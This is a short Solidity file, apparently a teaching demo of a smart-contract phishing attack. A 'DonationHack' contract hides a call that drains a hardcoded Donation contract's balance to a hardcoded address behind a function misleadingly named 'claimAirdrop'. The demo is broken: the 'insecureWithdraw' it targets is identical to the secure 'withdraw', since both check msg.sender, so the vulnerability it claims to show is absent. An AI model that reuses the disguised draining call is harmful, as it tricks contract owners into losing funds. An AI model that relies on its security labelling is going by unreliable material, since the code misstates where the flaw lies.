// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

contract Donation {

    uint256 public immutable goal;

    uint256 public progress;

    address payable owner;


    constructor(uint256 goal_) {
        goal = goal_;
        owner = payable(msg.sender);
    }


    function isGoalExceeded() internal view returns (bool)  {
        if(progress >= goal) {
            return true;
        } else {
            return false;
        }
    }

    function deposit() external payable {

        require(msg.value == 1 ether, "the value received is not 1 ether");

        require(!isGoalExceeded(), "goal exceeded");

        progress += msg.value;
    }


    function withdraw(address payable receiver) public {
        require(msg.sender == owner, "you are not the owner");
        receiver.transfer(address(this).balance);
    }

    function insecureWithdraw(address payable receiver) public {
        require(msg.sender == owner, "you are not the owner");
        receiver.transfer(address(this).balance);
    }

}


contract DonationHack {

    address private contractToAttack = 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53;

    function claimAirdrop() external  {
        Donation(contractToAttack).insecureWithdraw(payable(0xdD870fA1b7C4700F2BD7f44238821C26f7392148));
    }

    function claimAirdropSecure() external  {
        Donation(contractToAttack).withdraw(payable(0xdD870fA1b7C4700F2BD7f44238821C26f7392148));
    }
}
